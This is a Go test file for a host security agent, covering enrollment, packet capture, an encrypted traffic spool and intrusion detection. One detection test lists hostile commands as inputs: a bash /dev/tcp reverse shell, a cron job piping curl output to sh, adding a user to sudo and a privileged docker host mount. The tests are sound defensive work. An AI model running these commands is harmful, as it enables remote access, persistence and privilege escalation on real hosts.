package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	transport "github.com/lyflow/ly-flow-platform/transportreliability"
	"github.com/redis/go-redis/v9"
)

func TestParseRouteDev(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		wantIF string
	}{
		{
			name:   "route get format",
			input:  "8.8.8.8 via 172.17.0.1 dev eth0 src 172.17.0.2 uid 0\n",
			wantIF: "eth0",
		},
		{
			name:   "default route format",
			input:  "default via 192.168.1.1 dev ens33 proto dhcp metric 100",
			wantIF: "ens33",
		},
		{
			name:   "missing dev token",
			input:  "default via 192.168.1.1 proto dhcp metric 100",
			wantIF: "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := parseRouteDev(tc.input); got != tc.wantIF {
				t.Fatalf("parseRouteDev() = %q, want %q", got, tc.wantIF)
			}
		})
	}
}

func TestAgentEnrollAdoptsServerIdentityWithoutDerivingItFromHost(t *testing.T) {
	// Given
	var got struct {
		Hostname string `json:"hostname"`
		IP       string `json:"ip"`
	}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := json.NewDecoder(r.Body).Decode(&got); err != nil {
			t.Fatalf("decode enrollment request: %v", err)
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"code":0,"message":"success","data":{"agent_id":"server-issued-id","agent_key":"server-issued-key"}}`))
	}))
	defer server.Close()
	configPath := filepath.Join(t.TempDir(), "agent.yaml")
	if err := os.WriteFile(configPath, []byte("server:\n  api: preserve-me\ntraffic:\n  enabled: true\n"), 0o640); err != nil {
		t.Fatalf("write config fixture: %v", err)
	}
	t.Setenv("AGENT_CONFIG", configPath)
	agent := NewAgent(&Config{API: server.URL})
	agent.hostname = "characterized-host"
	agent.localIP = "192.0.2.10"

	// When
	err := agent.enroll()

	// Then
	if err != nil {
		t.Fatalf("enroll: %v", err)
	}
	if got.Hostname != "characterized-host" || got.IP != "192.0.2.10" {
		t.Fatalf("enrollment host data = hostname %q ip %q", got.Hostname, got.IP)
	}
	if agent.agentID != "server-issued-id" || agent.agentKey != "server-issued-key" {
		t.Fatalf("agent credentials = id %q key %q", agent.agentID, agent.agentKey)
	}
	reloaded := &Config{}
	values, err := parseSimpleYAML(configPath)
	if err != nil {
		t.Fatalf("reload persisted config: %v", err)
	}
	applyYAMLConfig(reloaded, values)
	if reloaded.AgentID != "server-issued-id" || reloaded.AgentKey != "server-issued-key" {
		t.Fatalf("reloaded credentials = id %q key %q", reloaded.AgentID, reloaded.AgentKey)
	}
	persisted, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatalf("read persisted config: %v", err)
	}
	if !bytes.Contains(persisted, []byte("api: preserve-me")) || bytes.Contains(persisted, []byte("enrollment")) {
		t.Fatalf("persisted config did not preserve unrelated content or retained enrollment token: %s", persisted)
	}
}

func TestAgentEnrollRejectsMissingBlankOrNonStringCredentials(t *testing.T) {
	tests := []struct {
		name string
		data string
	}{
		{name: "missing key", data: `{"agent_id":"issued-id"}`},
		{name: "blank key", data: `{"agent_id":"issued-id","agent_key":"  "}`},
		{name: "non-string key", data: `{"agent_id":"issued-id","agent_key":42}`},
		{name: "blank id", data: `{"agent_id":" ","agent_key":"issued-secret"}`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			// Given
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				w.Header().Set("Content-Type", "application/json")
				_, _ = w.Write([]byte(`{"code":0,"data":` + test.data + `}`))
			}))
			defer server.Close()
			configPath := filepath.Join(t.TempDir(), "agent.yaml")
			if err := os.WriteFile(configPath, []byte("server:\n  api: unchanged\n"), 0o600); err != nil {
				t.Fatalf("write config fixture: %v", err)
			}
			t.Setenv("AGENT_CONFIG", configPath)
			agent := NewAgent(&Config{API: server.URL})

			// When
			output, err := captureStdout(t, agent.enroll)

			// Then
			if err == nil {
				t.Fatal("enrollment accepted an invalid credential response")
			}
			if strings.Contains(output, "Enroll successful") || agent.agentID != "" || agent.agentKey != "" || agent.cfg.AgentID != "" || agent.cfg.AgentKey != "" {
				t.Fatalf("invalid response produced success or credential adoption: output=%q id=%q", output, agent.agentID)
			}
		})
	}
}

func TestAgentEnrollPersistenceFailureFailsClosedWithoutCredentialLeak(t *testing.T) {
	// Given
	const credential = "issued-secret-that-must-not-leak"
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"code":0,"data":{"agent_id":"issued-id","agent_key":"` + credential + `"}}`))
	}))
	defer server.Close()
	t.Setenv("AGENT_CONFIG", filepath.Join(t.TempDir(), "missing", "agent.yaml"))
	agent := NewAgent(&Config{API: server.URL})

	// When
	output, err := captureStdout(t, agent.enroll)

	// Then
	if err == nil {
		t.Fatal("enrollment succeeded despite credential persistence failure")
	}
	if agent.agentID != "" || agent.agentKey != "" || agent.cfg.AgentID != "" || agent.cfg.AgentKey != "" {
		t.Fatalf("credentials adopted after persistence failure: id=%q", agent.agentID)
	}
	if strings.Contains(output, credential) || strings.Contains(err.Error(), credential) || strings.Contains(output, "Enroll successful") {
		t.Fatal("persistence failure leaked credential or printed success")
	}
}

func captureStdout(t *testing.T, action func() error) (string, error) {
	t.Helper()
	reader, writer, err := os.Pipe()
	if err != nil {
		t.Fatalf("open stdout pipe: %v", err)
	}
	original := os.Stdout
	os.Stdout = writer
	actionErr := action()
	os.Stdout = original
	if err := writer.Close(); err != nil {
		t.Fatalf("close stdout writer: %v", err)
	}
	output, err := io.ReadAll(reader)
	if err != nil {
		t.Fatalf("read stdout: %v", err)
	}
	if err := reader.Close(); err != nil {
		t.Fatalf("close stdout reader: %v", err)
	}
	return string(output), actionErr
}

func TestResolveTrafficInterface(t *testing.T) {
	t.Run("explicit override wins", func(t *testing.T) {
		cfg := &Config{TrafficInterface: "ens160", API: "http://127.0.0.1:8080"}
		if got := resolveTrafficInterface(cfg); got != "ens160" {
			t.Fatalf("resolveTrafficInterface() = %q, want ens160", got)
		}
	})

	t.Run("auto resolves to host default route", func(t *testing.T) {
		cfg := &Config{TrafficInterface: "auto", API: "http://127.0.0.1:8080"}
		got := resolveTrafficInterface(cfg)
		if got == "" || got == "lo" {
			t.Fatalf("resolveTrafficInterface() = %q, want active non-loopback default-route interface", got)
		}
	})
}

func TestSelectCaptureEngine(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"", defaultCaptureEngineForTest()},
		{"auto", defaultCaptureEngineForTest()},
		{"afpacket", "af_packet"},
		{"pcap", "pcap"},
		{"ebpf", "ebpf"},
		{"pf_ring", "pfring"},
		{"procfs", "procfs"},
		{"unknown", defaultCaptureEngineForTest()},
	}
	for _, tc := range tests {
		t.Run(tc.input, func(t *testing.T) {
			if got := selectCaptureEngine(tc.input); got != tc.want {
				t.Fatalf("selectCaptureEngine(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestObservationFromPacketKeepsICMP(t *testing.T) {
	packet := gopacket.NewPacket([]byte{
		0x45, 0x00, 0x00, 0x1c, 0x00, 0x01, 0x00, 0x00,
		0x40, 0x01, 0x00, 0x00, 0x0a, 0x01, 0x12, 0x06,
		0xdf, 0x05, 0x05, 0x05, 0x08, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x01,
	}, layers.LayerTypeIPv4, gopacket.Default)
	agent := NewAgent(&Config{TrafficInterface: "auto"})
	obs := agent.observationFromPacket(packet, len(packet.Data()), "pcap")
	if obs.Protocol != "ICMP" || obs.SrcIP != "10.1.18.6" || obs.DstIP != "223.5.5.5" {
		t.Fatalf("observationFromPacket(ICMP) = protocol=%q src=%q dst=%q", obs.Protocol, obs.SrcIP, obs.DstIP)
	}
}

func TestObservationFromEthernetPacketKeepsICMP(t *testing.T) {
	packet := gopacket.NewPacket([]byte{
		0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
		0x88, 0x99, 0xaa, 0xbb, 0x08, 0x00,
		0x45, 0x00, 0x00, 0x1c, 0x00, 0x01, 0x00, 0x00,
		0x40, 0x01, 0x00, 0x00, 0x0a, 0x01, 0x12, 0x06,
		0xdf, 0x05, 0x05, 0x05, 0x08, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x00, 0x01,
	}, layers.LayerTypeEthernet, gopacket.Default)
	agent := NewAgent(&Config{TrafficInterface: "ens33"})
	obs := agent.observationFromPacket(packet, len(packet.Data()), "af_packet")
	if obs.Protocol != "ICMP" || obs.SrcIP != "10.1.18.6" || obs.DstIP != "223.5.5.5" {
		t.Fatalf("observationFromPacket(ethernet ICMP) = protocol=%q src=%q dst=%q", obs.Protocol, obs.SrcIP, obs.DstIP)
	}
}

func defaultCaptureEngineForTest() string {
	return "af_packet"
}

func TestResolveCaptureCapabilityIsHonestAboutFallbacks(t *testing.T) {
	pfringActiveEngine := "af_packet"
	pfringStatus := "fallback"
	pfringReasonEmpty := false
	if pfringAdapterCompiled() && pfRingAvailable() {
		pfringActiveEngine = "pfring"
		pfringStatus = "active"
		pfringReasonEmpty = true
	}
	tests := []struct {
		name            string
		requested       string
		wantActive      string
		wantStatus      string
		wantReasonEmpty bool
	}{
		{"af packet active", "af_packet", "af_packet", "active", true},
		{"ebpf falls back", "ebpf", "af_packet", "fallback", false},
		{"pfring capability follows appliance build and kernel module", "pfring", pfringActiveEngine, pfringStatus, pfringReasonEmpty},
		{"procfs fallback", "procfs", "procfs", "fallback", false},
		{"pcap unsupported", "pcap", "af_packet", "fallback", false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := resolveCaptureCapability(tc.requested)
			if got.ActiveEngine != tc.wantActive || got.Status != tc.wantStatus {
				t.Fatalf("resolveCaptureCapability(%q) = active %q status %q, want active %q status %q", tc.requested, got.ActiveEngine, got.Status, tc.wantActive, tc.wantStatus)
			}
			if tc.wantReasonEmpty && got.FallbackReason != "" {
				t.Fatalf("FallbackReason = %q, want empty", got.FallbackReason)
			}
			if !tc.wantReasonEmpty && got.FallbackReason == "" {
				t.Fatal("FallbackReason is empty, want explicit fallback reason")
			}
		})
	}
}

func TestCentOS7KernelEBPFUnsupportedGate(t *testing.T) {
	if !isCentOS7Kernel("3.10.0-1160.el7.x86_64") {
		t.Fatal("CentOS7 3.10 kernel should be detected as unsupported for eBPF")
	}
	if isCentOS7Kernel("4.18.0-425.el8.x86_64") {
		t.Fatal("EL8 4.18 kernel should not be treated as CentOS7 eBPF-unsupported")
	}
}

func TestCapabilityModelIncludesModuleStatuses(t *testing.T) {
	agent := NewAgent(&Config{
		TrafficEnabled:   true,
		CaptureEngine:    "ebpf",
		TrafficInterface: "ens33",
		BPFFilter:        "tcp or udp",
		RawStream:        "flows:raw",
		SemanticStream:   "flows:semantic",
		HIDSEnabled:      true,
		RuntimeStream:    "alerts:runtime",
		RASPEnabled:      true,
		RASPStream:       "alerts:rasp",
		AssetEnabled:     true,
	})

	model := agent.capabilityModel()
	if model["schema_version"] != "lyflow.agent.capability.v1" {
		t.Fatalf("schema_version = %v", model["schema_version"])
	}
	traffic := model["traffic_collector"].(map[string]interface{})
	if traffic["requested_engine"] != "ebpf" || traffic["active_engine"] != "af_packet" || traffic["backend_status"] != "fallback" {
		t.Fatalf("traffic capability not honest about ebpf fallback: %+v", traffic)
	}
	runtimeSensor := model["runtime_sensor"].(map[string]interface{})
	if runtimeSensor["enabled"] != true || runtimeSensor["stream"] != "alerts:runtime" {
		t.Fatalf("runtime capability mismatch: %+v", runtimeSensor)
	}
	rasp := model["rasp_probe_manager"].(map[string]interface{})
	if rasp["python"] != "sitecustomize_runtime_hooks" || rasp["php"] != "native_extension_with_prepend_fallback" || rasp["java"] != "javaagent_security_jdbc_hooks" {
		t.Fatalf("rasp hook capability labels missing: %+v", rasp)
	}
}

func TestApplyPulledConfigUpdatesCollectorDesiredState(t *testing.T) {
	agent := NewAgent(&Config{
		TrafficEnabled:   true,
		TrafficInterface: "ens33",
		CaptureEngine:    "af_packet",
		BPFFilter:        "tcp or udp",
		Promiscuous:      true,
		HIDSEnabled:      true,
		RASPEnabled:      true,
	})
	agent.trafficStarted = true
	agent.hidsStarted = true
	agent.raspStarted = true

	agent.applyPulledConfig(map[string]interface{}{
		"policy": map[string]interface{}{
			"traffic": map[string]interface{}{"enabled": false, "interface": "auto", "capture_engine": "procfs", "bpf_filter": "udp", "promiscuous": false},
			"runtime": map[string]interface{}{"enabled": false},
			"rasp":    map[string]interface{}{"enabled": false},
		},
	})

	if agent.cfg.TrafficEnabled || agent.cfg.HIDSEnabled || agent.cfg.RASPEnabled {
		t.Fatalf("collector desired state not disabled: traffic=%v hids=%v rasp=%v", agent.cfg.TrafficEnabled, agent.cfg.HIDSEnabled, agent.cfg.RASPEnabled)
	}
	if agent.cfg.TrafficInterface != "ens33" {
		t.Fatalf("auto interface should not overwrite selected interface, got %q", agent.cfg.TrafficInterface)
	}
	if agent.cfg.CaptureEngine != "procfs" || agent.cfg.BPFFilter != "udp" || agent.cfg.Promiscuous {
		t.Fatalf("traffic config not applied: engine=%q filter=%q promiscuous=%v", agent.cfg.CaptureEngine, agent.cfg.BPFFilter, agent.cfg.Promiscuous)
	}

	agent.applyPulledConfig(map[string]interface{}{
		"policy": map[string]interface{}{
			"traffic": map[string]interface{}{"enabled": "true", "interface": "ens160"},
			"runtime": map[string]interface{}{"enabled": "true"},
			"rasp":    map[string]interface{}{"enabled": "true"},
		},
	})

	if !agent.cfg.TrafficEnabled || !agent.cfg.HIDSEnabled || !agent.cfg.RASPEnabled {
		t.Fatalf("collector desired state not enabled: traffic=%v hids=%v rasp=%v", agent.cfg.TrafficEnabled, agent.cfg.HIDSEnabled, agent.cfg.RASPEnabled)
	}
	if agent.cfg.TrafficInterface != "ens160" {
		t.Fatalf("TrafficInterface = %q, want ens160", agent.cfg.TrafficInterface)
	}
}

func TestTrafficCaptureEnabledRequiresSameInterface(t *testing.T) {
	agent := NewAgent(&Config{TrafficEnabled: true, TrafficInterface: "ens33"})
	if !agent.trafficCaptureEnabledOnCurrentInterface("ens33") {
		t.Fatal("capture should be enabled on configured interface")
	}
	if agent.trafficCaptureEnabledOnCurrentInterface("ens160") {
		t.Fatal("capture should pause after mirror interface changes")
	}
	if !agent.trafficCaptureInterfaceChanged("ens160") {
		t.Fatal("capture should request restart after mirror interface changes")
	}
	agent.cfg.TrafficEnabled = false
	if agent.trafficCaptureEnabledOnCurrentInterface("ens33") {
		t.Fatal("capture should pause when traffic is disabled")
	}
}

func TestRuntimeFallbackEventCarriesHonestBackendMetadata(t *testing.T) {
	agent := NewAgent(&Config{HIDSEnabled: true, RuntimeStream: "alerts:runtime"})
	agent.agentID = "agent-runtime-test"
	event := buildSyntheticRuntimeEvent(agent, "ebpf", "ebpf-fallback")

	if event.Strategy != "ebpf" || event.Backend != "ebpf-fallback" {
		t.Fatalf("runtime event backend mismatch: %#v", event)
	}
	if event.CapabilityStatus != "fallback" {
		t.Fatalf("CapabilityStatus = %q, want fallback", event.CapabilityStatus)
	}
	if event.SourceEvidence == "" {
		t.Fatal("SourceEvidence is empty")
	}
	if event.Metadata["collector"] != "synthetic-fallback" {
		t.Fatalf("collector metadata missing: %#v", event.Metadata)
	}
	if event.Metadata["fallback_reason"] == "" {
		t.Fatalf("fallback_reason metadata missing: %#v", event.Metadata)
	}
}

func TestPublishTrafficObservationPreservesNetworkProtocolForICMP(t *testing.T) {
	agent := NewAgent(&Config{
		API:                    "http://127.0.0.1:8080",
		Redis:                  "127.0.0.1:0",
		TrafficInterface:       "auto",
		RawStream:              "flows:raw",
		SemanticStream:         "flows:semantic",
		SessionStream:          "sessions:semantic",
		SessionEnabled:         true,
		TrafficTelemetryStream: "",
	})
	obs := trafficObservation{
		Timestamp:   time.Unix(1700000000, 0).UTC(),
		Engine:      "pcap",
		SrcIP:       "10.1.18.6",
		DstIP:       "223.5.5.5",
		Protocol:    "ICMP",
		AppProtocol: "ICMP",
		Packets:     1,
	}

	client := &recordingStreamClient{}
	if err := agent.publishTrafficObservationToStreams(client, obs); err != nil {
		t.Fatalf("publishTrafficObservationToStreams() error = %v", err)
	}
	session := client.valuesForStream("sessions:semantic")
	if session["protocol"] != "ICMP" || session["app_protocol"] != "ICMP" {
		t.Fatalf("session protocol fields = protocol %v app_protocol %v, want ICMP/ICMP", session["protocol"], session["app_protocol"])
	}
	semantic := client.valuesForStream("flows:semantic")
	if semantic["protocol"] != "ICMP" || semantic["dst_ip"] != "223.5.5.5" {
		t.Fatalf("semantic flow = protocol %v dst %v, want ICMP 223.5.5.5", semantic["protocol"], semantic["dst_ip"])
	}
}

type recordingStreamClient struct {
	entries []recordedStreamEntry
}

type recordedStreamEntry struct {
	stream string
	values map[string]interface{}
}

func (c *recordingStreamClient) publish(ctx context.Context, stream string, payload map[string]interface{}, payloadType string) error {
	copied := map[string]interface{}{}
	for key, value := range payload {
		copied[key] = value
	}
	c.entries = append(c.entries, recordedStreamEntry{stream: stream, values: copied})
	return nil
}

func (c *recordingStreamClient) valuesForStream(stream string) map[string]interface{} {
	for _, entry := range c.entries {
		if entry.stream == stream {
			return entry.values
		}
	}
	return nil
}

func TestDurableTrafficSpoolPersistsBeforeRedisAck(t *testing.T) {
	dir := t.TempDir()
	encrypted, err := transport.NewEncryptedSpool(transport.SpoolConfig{
		Dir: filepath.Join(dir, "v2"), Key: []byte("0123456789abcdef0123456789abcdef"), MaxBytes: 1024 * 1024, MaxAge: time.Hour,
	})
	if err != nil {
		t.Fatalf("create encrypted spool: %v", err)
	}
	spool := &durableTrafficSpool{
		maxBytes:  1024 * 1024,
		encrypted: encrypted,
	}
	payload := map[string]interface{}{"id": "flow-1", "src_ip": "10.0.0.1"}
	if err := spool.publish(context.Background(), "flows:raw", payload, "raw_flow"); err != nil {
		t.Fatalf("spool publish error: %v", err)
	}
	entries, err := os.ReadDir(filepath.Join(dir, "v2", "pending"))
	if err != nil {
		t.Fatalf("read spool dir: %v", err)
	}
	wals := make([]os.DirEntry, 0, len(entries))
	for _, entry := range entries {
		if !entry.IsDir() {
			wals = append(wals, entry)
		}
	}
	if len(wals) != 1 {
		t.Fatalf("spool wal files = %d, want 1", len(wals))
	}
	data, err := os.ReadFile(filepath.Join(dir, "v2", "pending", wals[0].Name()))
	if err != nil {
		t.Fatalf("read spool record: %v", err)
	}
	if strings.Contains(string(data), "10.0.0.1") || strings.Contains(string(data), "flows:raw") {
		t.Fatalf("spool record contains plaintext: %q", data)
	}
}

func TestDurableTrafficSpoolKeepsPendingOnRedisError(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "1-flows_raw.wal")
	record := spoolRecord{Version: 1, RecordID: "1", Stream: "flows:raw", Type: "raw_flow", Data: `{"id":"flow-1"}`}
	if err := writeSpoolRecord(path, record); err != nil {
		t.Fatalf("write spool record: %v", err)
	}
	spool := &durableTrafficSpool{pendingDir: dir, client: nilRedisClient{}, ctx: context.Background()}
	if err := spool.flushFile(path); err == nil {
		t.Fatal("flushFile succeeded with failing redis client")
	}
	if _, err := os.Stat(path); err != nil {
		t.Fatalf("pending spool record missing after redis error: %v", err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read pending spool record: %v", err)
	}
	var updated spoolRecord
	if err := json.Unmarshal(data, &updated); err != nil {
		t.Fatalf("updated spool record json: %v", err)
	}
	if updated.Attempts != 1 || updated.LastError == "" {
		t.Fatalf("attempt metadata not recorded: %#v", updated)
	}
}

func TestDurableTrafficSpoolRemovesPendingAfterRedisAck(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "1-flows_raw.wal")
	record := spoolRecord{Version: 1, RecordID: "1", Stream: "flows:raw", Type: "raw_flow", Data: `{"id":"flow-1"}`}
	if err := writeSpoolRecord(path, record); err != nil {
		t.Fatalf("write spool record: %v", err)
	}
	spool := &durableTrafficSpool{pendingDir: dir, client: recordingRedisClient{}, ctx: context.Background()}
	if err := spool.flushFile(path); err != nil {
		t.Fatalf("flushFile error: %v", err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("expected acked spool record removed, stat err=%v", err)
	}
}

func TestDurableTrafficSpoolDeliversOverHTTP(t *testing.T) {
	var request map[string]interface{}
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/v1/agent/traffic-event" {
			t.Fatalf("unexpected path: %s", r.URL.Path)
		}
		if r.Header.Get("X-Lyflow-Agent-ID") != "agent-win" || r.Header.Get("Authorization") != "Bearer key-win" {
			t.Fatalf("missing agent authentication headers: id=%q authorization=%q", r.Header.Get("X-Lyflow-Agent-ID"), r.Header.Get("Authorization"))
		}
		if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
			t.Fatalf("decode request: %v", err)
		}
		_ = json.NewEncoder(w).Encode(map[string]interface{}{"code": 0, "message": "success"})
	}))
	defer server.Close()
	spool := &durableTrafficSpool{httpEndpoint: server.URL + "/api/v1/agent/traffic-event", agentID: "agent-win", agentKey: "key-win"}
	record := spoolRecord{Stream: "sessions:semantic", Type: "semantic_session", Data: `{"id":"session-1"}`}
	if err := spool.deliver(record, map[string]interface{}{"type": record.Type, "data": record.Data}); err != nil {
		t.Fatalf("deliver over http: %v", err)
	}
	if request["agent_id"] != "agent-win" || request["stream"] != "sessions:semantic" {
		t.Fatalf("unexpected request: %#v", request)
	}
	if _, exists := request["agent_key"]; exists {
		t.Fatalf("credential leaked into payload: %#v", request)
	}
}

func TestEndpointAgentSpoolUsesHTTPTransport(t *testing.T) {
	spool, err := newDurableTrafficSpool(context.Background(), &Config{SpoolEnabled: true, SpoolDir: t.TempDir(), API: "https://platform.example", AgentKey: "test-agent-key"})
	if err != nil {
		t.Fatalf("newDurableTrafficSpool error: %v", err)
	}
	defer spool.Close()
	if spool.httpEndpoint != "https://platform.example/api/v1/agent/traffic-event" {
		t.Fatalf("httpEndpoint=%q, want HTTPS traffic ingest endpoint", spool.httpEndpoint)
	}
}

func TestDurableTrafficSpoolRecoversValidTempFiles(t *testing.T) {
	dir := t.TempDir()
	tmpDir := filepath.Join(dir, "tmp")
	if err := os.MkdirAll(tmpDir, 0o750); err != nil {
		t.Fatalf("mkdir tmp: %v", err)
	}
	tmpPath := filepath.Join(tmpDir, "1-flows_raw.wal.tmp")
	record := spoolRecord{Version: 1, RecordID: "1", Stream: "flows:raw", Type: "raw_flow", Data: `{"id":"flow-1"}`}
	if err := writeSpoolRecord(tmpPath, record); err != nil {
		t.Fatalf("write temp spool record: %v", err)
	}
	spool := &durableTrafficSpool{pendingDir: dir, tmpDir: tmpDir}
	if err := spool.recoverTempFiles(); err != nil {
		t.Fatalf("recoverTempFiles error: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "1-flows_raw.wal")); err != nil {
		t.Fatalf("recovered wal missing: %v", err)
	}
	if _, err := os.Stat(tmpPath); !os.IsNotExist(err) {
		t.Fatalf("expected temp file renamed, stat err=%v", err)
	}
}

func TestDurableTrafficSpoolFlushesToLiveRedis(t *testing.T) {
	redisAddr := os.Getenv("LYFLOW_REDIS_INTEGRATION_ADDR")
	if redisAddr == "" {
		t.Skip("set LYFLOW_REDIS_INTEGRATION_ADDR to run live Redis spool test")
	}
	dir := t.TempDir()
	ctx := context.Background()
	cfg := &Config{
		Redis:               redisAddr,
		RedisUsername:       os.Getenv("REDIS_ACL_USERNAME"),
		RedisPassword:       os.Getenv("REDIS_ACL_PASSWORD"),
		RedisLegacyPassword: os.Getenv("REDIS_PASSWORD"),
	}
	client := redis.NewClient(redisOptions(cfg))
	defer client.Close()
	stream := "spool:integration:test"
	_ = client.Del(ctx, stream).Err()
	spool := &durableTrafficSpool{
		pendingDir: dir,
		client:     client,
		ctx:        ctx,
	}
	path := filepath.Join(dir, "1-spool_integration.wal")
	record := spoolRecord{Version: 1, RecordID: "1", Stream: stream, Type: "raw_flow", Data: `{"id":"flow-live"}`}
	if err := writeSpoolRecord(path, record); err != nil {
		t.Fatalf("write spool record: %v", err)
	}
	if err := spool.flushFile(path); err != nil {
		t.Fatalf("flushFile live redis: %v", err)
	}
	if got := client.XLen(ctx, stream).Val(); got != 1 {
		t.Fatalf("live redis stream length = %d, want 1", got)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("expected acked live spool record removed, stat err=%v", err)
	}
	_ = client.Del(ctx, stream).Err()
}

type recordingRedisClient struct{}

func (recordingRedisClient) XAdd(ctx context.Context, args *redis.XAddArgs) *redis.StringCmd {
	cmd := redis.NewStringCmd(ctx)
	cmd.SetVal("1-0")
	return cmd
}

func (recordingRedisClient) Close() error { return nil }

type nilRedisClient struct{}

func (nilRedisClient) XAdd(ctx context.Context, args *redis.XAddArgs) *redis.StringCmd {
	cmd := redis.NewStringCmd(ctx)
	cmd.SetErr(errors.New("redis unavailable"))
	return cmd
}

func (nilRedisClient) Close() error { return nil }

func TestUnsupportedRuntimeBackendDoesNotEmitSyntheticEvent(t *testing.T) {
	agent := NewAgent(&Config{HIDSEnabled: true, RuntimeStream: "alerts:runtime"})
	agent.agentID = "agent-runtime-test"
	backend := NewRuntimeMonitorBackend("unsupported")
	events := backend.Collect(agent)
	if len(events) != 0 {
		t.Fatalf("expected no synthetic fallback events, got %d", len(events))
	}
}

func TestHIDSProcessSignalCoversElkeidWazuhLikePatterns(t *testing.T) {
	tests := []struct {
		name         string
		cmd          string
		wantSeverity string
		wantSignal   string
	}{
		{"reverse shell", "bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "high", "reverse-shell-or-dangerous-exec"},
		{"persistence", "crontab -l && echo '* * * * * curl http://x/p.sh|sh'", "medium", "persistence-change"},
		{"credential", "usermod -aG sudo attacker", "high", "credential-or-account-change"},
		{"container escape", "docker run --privileged -v /:/host alpine", "high", "container-privilege-escalation"},
		{"ordinary", "/usr/bin/true", "low", "new-process"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sev, signal := processSignal(processSnapshot{Cmdline: tt.cmd})
			if sev != tt.wantSeverity || signal != tt.wantSignal {
				t.Fatalf("processSignal() = %q/%q, want %q/%q", sev, signal, tt.wantSeverity, tt.wantSignal)
			}
		})
	}
}

func TestHIDSAuthSignalCoversPrivilegeAndAccountChanges(t *testing.T) {
	tests := []struct {
		line          string
		wantEventType string
		wantSeverity  string
		wantOK        bool
	}{
		{"sshd[1]: Accepted password for root from 203.0.113.10 port 22 ssh2", "", "", false},
		{"sudo: pam_unix(sudo:auth): authentication failure", "runtime.auth.sudo_failure", "medium", true},
		{"sshd[1]: Failed password for invalid user test from 1.1.1.1", "runtime.auth.failure", "medium", true},
		{"useradd[1]: new user: name=attacker, UID=1001", "runtime.auth.account_change", "high", true},
		{"kernel: ordinary line", "", "", false},
	}
	for _, tt := range tests {
		eventType, severity, _, ok := classifyAuthSignal(tt.line)
		if eventType != tt.wantEventType || severity != tt.wantSeverity || ok != tt.wantOK {
			t.Fatalf("classifyAuthSignal(%q) = %q/%q/%v, want %q/%q/%v", tt.line, eventType, severity, ok, tt.wantEventType, tt.wantSeverity, tt.wantOK)
		}
	}
}

func TestHIDSFileSignalSeverityCoversPersistenceFiles(t *testing.T) {
	if got := fileSignalSeverity("/etc/ld.so.preload"); got != "high" {
		t.Fatalf("ld.so.preload severity = %q, want high", got)
	}
	if got := fileSignalSeverity("/root/.ssh/authorized_keys"); got != "medium" {
		t.Fatalf("authorized_keys severity = %q, want medium", got)
	}
}

func TestTrafficRetentionWritesBoundedReferenceForSuspiciousFlow(t *testing.T) {
	dir := t.TempDir()
	agent := NewAgent(&Config{RetentionEnabled: true, RetentionDir: dir})
	agent.agentID = "agent-retention"
	agent.hostname = "host-retention"
	ref, err := agent.retainTrafficReference("flow-1", trafficObservation{HTTPPath: "/admin/upload", HTTPHost: "app.local", Protocol: "TCP"}, "upload")
	if err != nil {
		t.Fatalf("retainTrafficReference error: %v", err)
	}
	if ref == nil || ref["capture_ref"] == "" || ref["cleanup_policy"] == "" {
		t.Fatalf("retention reference missing fields: %#v", ref)
	}
	data, err := os.ReadFile(filepath.Join(dir, "flow-1.json"))
	if err != nil {
		t.Fatalf("expected retention metadata file: %v", err)
	}
	if len(data) > 4096 {
		t.Fatalf("retention file too large: %d", len(data))
	}
	var payload map[string]interface{}
	if err := json.Unmarshal(data, &payload); err != nil {
		t.Fatalf("retention file is not JSON: %v", err)
	}
}

func TestTrafficRetentionDisabledWritesNoReference(t *testing.T) {
	dir := t.TempDir()
	agent := NewAgent(&Config{RetentionEnabled: false, RetentionDir: dir})
	ref, err := agent.retainTrafficReference("flow-disabled", trafficObservation{HTTPPath: "/admin"}, "admin_access")
	if err != nil {
		t.Fatalf("retainTrafficReference error: %v", err)
	}
	if ref != nil {
		t.Fatalf("expected nil reference when retention disabled, got %#v", ref)
	}
	if _, err := os.Stat(filepath.Join(dir, "flow-disabled.json")); !os.IsNotExist(err) {
		t.Fatalf("expected no retention file, stat err=%v", err)
	}
}

func TestParseProcNetAddr(t *testing.T) {
	ip, port := parseProcNetAddr("6401A8C0:1F90")
	if ip != "192.168.1.100" || port != 8080 {
		t.Fatalf("parseProcNetAddr() = %s:%d, want 192.168.1.100:8080", ip, port)
	}
}

func TestParseHTTPRequest(t *testing.T) {
	method, path, host, ok := parseHTTPRequest([]byte("POST /login HTTP/1.1\r\nHost: app.example\r\n\r\n"))
	if !ok || method != "POST" || path != "/login" || host != "app.example" {
